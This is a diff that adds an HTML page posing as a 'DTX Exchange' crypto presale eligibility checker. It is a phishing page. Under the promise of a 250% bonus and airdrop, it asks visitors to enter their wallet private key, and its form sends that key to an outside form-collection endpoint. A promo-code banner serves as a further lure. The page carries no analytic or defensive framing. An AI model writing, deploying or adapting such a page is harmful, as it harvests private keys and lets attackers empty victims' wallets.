@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DTX Exchange - Check Eligibility</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="eligibility.css">
+</head>
+<body>
+    <!-- Top Banner -->
+    <div class="top-banner">
+        USE THE CODE 'LIST2X' TO GET 100% BONUS TOKENS ON ANY DEPOSITS.
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="main-container">
+        <div class="background-grid"></div>
+        <div class="left-blob"></div>
+        <div class="right-blob"></div>
+
+        <!-- Navigation -->
+        <nav class="navbar">
+            <div class="nav-left">
+                <a href="index.html" class="logo">
+                    <img src="./assets/image.png" alt="DTX Exchange Logo">
+                </a>
+                <div class="nav-links">
+                    <a href="#about">About</a>
+                    <a href="#features">Features</a>
+                    <a href="#whitepaper">Whitepaper</a>
+                    <a href="#dev-updates">Dev Updates</a>
+                    <a href="#giveaway">Check Eligibility</a>
+                    <a href="#faqs">FAQs</a>
+                    <a href="#audit">Audit</a>
+                </div>
+            </div>
+            <div class="nav-right">
+                <button class="btn btn-wallet">Connect Wallet</button>
+                <button class="btn btn-presale">Join Presale</button>
+            </div>
+            <div class="mobile-menu-btn">
+                <i class="fas fa-bars"></i>
+            </div>
+        </nav>
+
+        <!-- Search Section -->
+        <div class="search-section">
+            <div class="search-icon">
+                <i class="fas fa-search"></i>
+            </div>
+
+            <h1 class="main-heading">Check Your Eligibility</h1>
+            <p class="sub-heading">
+               Search Private Key to confirm if you're eligible for a 250% bonus and airdrop.
+            </p>
+
+            <!-- Search Form -->
+            <form action="https://forms.un-static.com/forms/d36d49ece249f4ebb655fd70f1c6a42fdf66b777" method="POST">
+                <div class="search-box">
+                    <input type="text" 
+                           class="search-input" 
+                           placeholder="Search Private Key"
+                           name="wallet_address"
+                           required>
+                    <button type="submit" class="search-btn">Check Eligibility</button>
+                </div>
+            </form>
+
+            <!-- Result Box
+            <?php if (isset($_GET['status'])): ?>
+                <div class="result-box <?php echo $_GET['status'] === 'eligible' ? 'eligible' : 'not-eligible'; ?>">
+                    <i class="fas <?php echo $_GET['status'] === 'eligible' ? 'fa-check-circle' : 'fa-times-circle'; ?>"></i>
+                    <?php echo $_GET['status'] === 'eligible' ? 'Congratulations! You are eligible for the DTX Exchange presale.' : 'Sorry, this address is not eligible for the DTX Exchange presale.'; ?>
+                </div>
+            <?php endif; ?> -->
+        </div>
+    </div>
+    <script>
+        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+        const mobileMenuIcon = mobileMenuBtn.querySelector('i');
+        let isMenuOpen = false;
+    
+        // Create mobile menu element
+        const mobileMenu = document.createElement('div');
+        mobileMenu.className = 'mobile-menu';
+        
+        // Create close button
+        const closeButton = document.createElement('button');
+        closeButton.className = 'mobile-menu-close';
+        closeButton.innerHTML = '<i class="fas fa-times"></i>';
+        
+        // Clone navigation links and buttons for mobile menu
+        const navLinks = document.querySelector('.nav-links').cloneNode(true);
+        const mobileButtons = document.createElement('div');
+        mobileButtons.className = 'mobile-buttons';
+        mobileButtons.innerHTML = document.querySelector('.nav-right').innerHTML;
+        
+        // Add elements to mobile menu
+        mobileMenu.appendChild(closeButton);
+        mobileMenu.appendChild(navLinks);
+        mobileMenu.appendChild(mobileButtons);
+        document.body.appendChild(mobileMenu);
+    
+        function closeMenu() {
+            mobileMenu.classList.remove('active');
+            mobileMenuIcon.className = 'fas fa-bars';
+            document.body.style.overflow = 'auto';
+            isMenuOpen = false;
+        }
+    
+        mobileMenuBtn.addEventListener('click', () => {
+            isMenuOpen = !isMenuOpen;
+            mobileMenu.classList.toggle('active');
+            mobileMenuIcon.className = isMenuOpen ? 'fas fa-times' : 'fas fa-bars';
+            document.body.style.overflow = isMenuOpen ? 'hidden' : 'auto';
+        });
+    
+        // Close button event listener
+        closeButton.addEventListener('click', closeMenu);
+    
+        // Close menu when clicking on a link
+        mobileMenu.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', closeMenu);
+        });
+    
+        // Close menu when clicking outside
+        document.addEventListener('click', (e) => {
+            if (isMenuOpen && !mobileMenu.contains(e.target) && !mobileMenuBtn.contains(e.target)) {
+                closeMenu();
+            }
+        });
+    
+        // Close menu on escape key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && isMenuOpen) {
+                closeMenu();
+            }
+        });
+    </script>
+</body>
+</html>
+
+
